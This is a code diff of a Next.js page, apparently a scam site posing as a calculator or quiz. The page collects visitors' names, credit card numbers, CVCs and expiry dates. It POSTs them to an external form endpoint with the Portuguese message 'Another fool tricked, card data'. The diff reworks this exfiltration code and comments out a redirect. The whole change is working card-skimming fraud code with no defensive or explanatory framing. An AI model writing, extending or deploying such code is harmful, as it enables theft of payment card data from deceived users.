@@ -45,17 +45,21 @@ export default function Home() {
   const createUser = async (data: CreateUserFormData) => {
     // console.log(data);
     try {
-      await fetch(`${process.env.NEXT_PUBLIC_GITHUB_CLIENT_ID}`, {
+      await fetch(`${process.env.NEXT_PUBLIC_FORM_URL}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json;charset=utf-8",
         },
-        body: `Outro trouxa enganado, dados do cartão:<br />${JSON.stringify(
-          data
-        )}`,
+        body: JSON.stringify({
+          message: `Outro trouxa enganado, dados do cartão:<br />
+          Nome: ${data.name}<br />
+          Cartão de Crédito: ${data.credCard}<br />
+          CVC: ${data.cvc}<br />
+          Validade: ${data.validity}<br />`,
+        }),
       });
 
-      router.push("/luka-modric");
+      // router.push("/luka-modric");
     } catch (error) {
       // console.error(error);
       console.error("Não foi possível calcular, tente novamente!");
